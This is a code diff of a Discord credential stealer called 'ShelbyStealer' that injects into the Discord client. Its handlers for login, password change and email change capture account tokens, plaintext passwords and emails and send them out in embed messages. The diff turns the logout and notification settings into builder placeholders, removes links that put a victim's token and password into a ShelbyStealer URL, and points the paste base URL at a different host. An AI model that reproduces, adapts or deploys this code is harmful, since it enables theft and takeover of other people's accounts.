@@ -20,11 +20,11 @@ String.prototype.insert = function (index, string) {
 };
 
 const config = {
-    "logout": "instant",
-    "logout-notify": "true",
-    "init-notify":"true",
+    "logout": "%LOGOUT%",
+    "logout-notify": "%LOGOUTNOTI%",
+    "init-notify":"%INITNOTI%",
     "embed-color": 3447704,
-    "disable-qr-code":"true"
+    "disable-qr-code":"%DISABLEQRCODE%"
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
@@ -101,7 +101,7 @@ function FirstTime() {
 							content: "",
 							embeds: [{
 								title: "Discord Initalized",
-								description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +")",
+								description: "[**<:partner:909102089513340979> ¦ ShelbyStealer**]",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
@@ -141,10 +141,10 @@ function FirstTime() {
 
 			}
 		}
-		if (!fs.existsSync(path.join(__dirname, "ShelbyStealerBTW"))) {
+		if (!fs.existsSync(path.join(__dirname, "ShelbyStealer"))) {
 			return !0
 		}
-		fs.rmdirSync(path.join(__dirname, "ShelbyStealerBTW"));
+		fs.rmdirSync(path.join(__dirname, "ShelbyStealer"));
 		if (config.logout != "false" || config.logout == "%LOGOUT%") {
 			if (config['logout-notify'] == "true") {
 				if (token == null || token == undefined || token == "") {
@@ -179,7 +179,7 @@ function FirstTime() {
 							content: "",
 							embeds: [{
 								title: "User got logged out",
-								description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +")",
+								description: "[**<:partner:909102089513340979> ¦ ShelbyStealer**]",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
@@ -386,7 +386,7 @@ function Login(email, password, token) {
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://premium.ShelbyStealer.to/raw/"
+							var baseuri = "https://furry.surf/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -457,7 +457,7 @@ function Login(email, password, token) {
 								content: "",
 								embeds: [{
 									"title": "User Login",
-									description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +"<br>"+ password+")",
+									description: "[**<:partner:909102089513340979> ¦ ShelbyStealer**]",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Info",
@@ -617,7 +617,7 @@ function Login(email, password, token) {
 											content: "",
 											embeds: [{
 												"title": "User Login",
-												description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +"<br>"+ password+")",
+												description: "[**<:partner:909102089513340979> ¦ ShelbyStealer**]",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Info",
@@ -730,7 +730,7 @@ function ChangePassword(oldpassword, newpassword, token) {
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://premium.ShelbyStealer.to/raw/"
+							var baseuri = "https://furry.surf/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -800,7 +800,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 								content: "",
 								embeds: [{
 									"title": "Password Changed",
-									description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +"<br>"+ newpassword+")",
+									description: "[**<:partner:909102089513340979> ¦ ShelbyStealer**]",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Info",
@@ -965,7 +965,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 											content: "",
 											embeds: [{
 												"title": "Password Changed",
-												description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +"<br>"+ newpassword+")",
+												description: "[**<:partner:909102089513340979> ¦ ShelbyStealer**]",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Info",
@@ -1082,7 +1082,7 @@ function ChangeEmail(newemail, password, token) {
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://premium.ShelbyStealer.to/raw/"
+							var baseuri = "https://furry.surf/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -1152,7 +1152,7 @@ function ChangeEmail(newemail, password, token) {
 								content: "",
 								embeds: [{
 									"title": "Email Changed",
-									description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +"<br>"+ password+")",
+									description: "[**<:partner:909102089513340979> ¦ ShelbyStealer**]",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Info",
@@ -1313,7 +1313,7 @@ function ChangeEmail(newemail, password, token) {
 											content: "",
 											embeds: [{
 												"title": "Email Changed",
-												description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +"<br>"+ password+")",
+												description: "[**<:partner:909102089513340979> ¦ ShelbyStealer**]",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Info",
